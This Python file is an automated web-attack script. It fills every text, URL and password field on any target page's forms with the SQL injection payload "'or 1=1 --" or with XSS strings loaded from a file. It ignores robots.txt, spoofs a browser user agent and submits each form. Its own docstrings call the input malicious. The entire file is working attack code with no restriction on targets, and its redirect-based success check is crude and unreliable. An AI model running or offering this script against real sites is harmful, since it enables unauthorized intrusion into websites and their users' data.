from bs4 import BeautifulSoup
from copy import deepcopy
import requests
import mechanize

# Lists of vulnerable field types
validfields = ["url", "text","password"]



def sqltest(url):
    """ Runs the Sql injection attack by:
        1. Using mechanize to retrieve the webpage
        2. Identifies all loaded forms on the webpage
        3. Runs the malicious text against the loaded forms"""

    br = mechanize.Browser()
    br.set_handle_robots(False)  # ignore robots
    br.set_handle_refresh(False)  # can sometimes hang without this
    br.addheaders = [('User-agent', 'Firefox')]
    br.open(url)
    for i, form in enumerate(br.forms()):
        tempBr = mechanize.Browser()
        tempBr.open(url)
        tempBr.select_form(nr=i)
        tempBr.set_all_readonly(False)  # allow everything to be written to
        for field in form.controls:
            if field.type in validfields:
                tempBr.form[field.name] = "'or 1=1 --"

        req = tempBr.form.click(type="submit")
        submitUrl = req.get_full_url()
        response = mechanize.urlopen(req)
        if response.geturl() != submitUrl:
            return True

    return False


def xsstest(url):

    """ Runs the attack by:
        1. Using mechanize to retrieve the webpage
        2. Identifies all loaded forms on the webpage
        3. Runs the malicious text against the loaded forms"""
    with open("XSSstrings.txt") as fin:
        XSSstrings = fin.read().splitlines()

    br = mechanize.Browser()
    br.set_handle_robots(False)  # ignore robots
    br.set_handle_refresh(False)  # can sometimes hang without this
    br.addheaders = [('User-agent', 'Firefox')]
    br.open(url)
    for i, form in enumerate(br.forms()):
        for string in XSSstrings:

            tempBr = mechanize.Browser()
            tempBr.open(url)
            tempBr.select_form(nr=i)
            tempBr.set_all_readonly(False)  # allow everything to be written to
            for field in form.controls:
                if field.type in validfields:
                    tempBr.form[field.name] = string

            req = tempBr.form.click(type="submit")
            submitUrl = req.get_full_url()
            response = mechanize.urlopen(req)
            if response.geturl() != submitUrl:
                return True
    return False

